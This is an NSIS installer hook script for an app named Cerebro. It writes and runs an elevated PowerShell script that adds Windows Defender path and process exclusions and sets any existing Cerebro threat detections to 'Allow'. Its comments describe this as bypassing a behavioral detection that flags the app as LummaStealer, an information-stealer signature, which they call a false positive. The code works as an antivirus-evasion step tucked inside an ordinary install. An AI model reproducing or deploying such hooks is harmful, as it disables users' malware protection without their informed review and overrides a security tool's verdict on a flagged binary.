; Custom NSIS installer hooks for Cerebro
; Adds Windows Defender exclusions during install to prevent
; Behavior:Win32/LummaStealer.CER!MTB false positive detection.
;
; Problem: Per-user installs don't have admin rights, but Add-MpPreference
; requires admin. Solution: write a PS1 script to temp, then self-elevate
; via Start-Process -Verb RunAs (shows UAC prompt during install).

!macro customInstall
  ; --- Write PowerShell script to temp file (avoids NSIS quote escaping hell) ---
  FileOpen $R0 "$PLUGINSDIR\defender-setup.ps1" w
  FileWrite $R0 "$$ErrorActionPreference = 'SilentlyContinue'$\r$\n"
  FileWrite $R0 "$\r$\n"
  FileWrite $R0 "# Add path exclusion for install directory$\r$\n"
  FileWrite $R0 "Add-MpPreference -ExclusionPath '$INSTDIR'$\r$\n"
  FileWrite $R0 "$\r$\n"
  FileWrite $R0 "# Add path exclusion for user data directory$\r$\n"
  FileWrite $R0 "Add-MpPreference -ExclusionPath (Join-Path $$env:USERPROFILE '.cerebro')$\r$\n"
  FileWrite $R0 "$\r$\n"
  FileWrite $R0 "# Add PROCESS exclusion (critical for behavioral detection bypass)$\r$\n"
  FileWrite $R0 "Add-MpPreference -ExclusionProcess 'Cerebro.exe'$\r$\n"
  FileWrite $R0 "$\r$\n"
  FileWrite $R0 "# Clear any existing Defender threat detections for Cerebro$\r$\n"
  FileWrite $R0 "# so Defender stops killing it on sight from previous flags$\r$\n"
  FileWrite $R0 "$$threats = Get-MpThreat -ErrorAction SilentlyContinue | Where-Object { $$_.Resources -match 'Cerebro' }$\r$\n"
  FileWrite $R0 "foreach ($$t in $$threats) {$\r$\n"
  FileWrite $R0 "    Add-MpPreference -ThreatIDDefaultAction_Ids $$t.ThreatID -ThreatIDDefaultAction_Actions Allow -ErrorAction SilentlyContinue$\r$\n"
  FileWrite $R0 "}$\r$\n"
  FileClose $R0

  ; --- Run the script with admin elevation (UAC prompt) ---
  DetailPrint "Configuring Windows Defender exclusion (admin required)..."
  nsExec::ExecToLog 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath powershell.exe -Verb RunAs -Wait -ArgumentList @(''-NoProfile'',''-ExecutionPolicy'',''Bypass'',''-File'',''$PLUGINSDIR\defender-setup.ps1'')"'

  ; Write marker so the app skips its own exclusion check on first run
  FileOpen $R0 "$INSTDIR\.defender-excluded" w
  FileWrite $R0 "installed"
  FileClose $R0
!macroend

!macro customUnInstall
  ; Remove Defender exclusions on uninstall (best-effort, non-elevated)
  DetailPrint "Removing Windows Defender exclusions..."
  nsExec::ExecToLog 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Remove-MpPreference -ExclusionPath ''$INSTDIR'' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionProcess ''Cerebro.exe'' -ErrorAction SilentlyContinue"'
!macroend
